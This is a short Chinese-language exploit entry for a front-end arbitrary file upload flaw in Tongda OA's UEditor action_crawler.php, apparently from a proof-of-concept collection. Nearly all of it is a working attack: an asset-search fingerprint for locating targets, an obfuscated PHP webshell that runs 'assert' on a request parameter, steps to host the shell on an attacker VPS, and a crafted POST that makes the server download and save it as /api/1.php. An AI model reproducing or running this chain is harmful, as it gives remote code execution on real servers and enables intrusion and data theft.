# 通达OAaction_crawler存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /module/ueditor/php/action_crawler.php HTTP/1.1`

**请求体 / payload**
```
1. 将webshell`2.php`上传到vps中
<?php class  Gisip4hi{/*FVzil1*/function __construct($x){$c=str_rot13('ffreg');/*FVzil1*/$a= ("!"^"@").$c;/*FVzil1*/$a($x);}}new  Gisip4hi($_REQUEST['x']); ?>
2. 使用python3启用http服务
python3 -m http.server 9000
3. 上传文件
Host: {hostname}
Content-Length: 197
Content-Type: application/x-www-form-urlencoded
CONFIG[catcherPathFormat]=/api/1&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=http://vpsip/2.php
4. 上传文件位置
GET /api/1.php HTTP/1.1
Host: {hostname}
Content-Length: 2

nuclei脚本\
\通达…（脚本共 647 字，完整版见原文）
```

**其他**
- 通达OA action\_crawler存在前台任意文件上传漏洞: * [一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2016-通达OA V11.6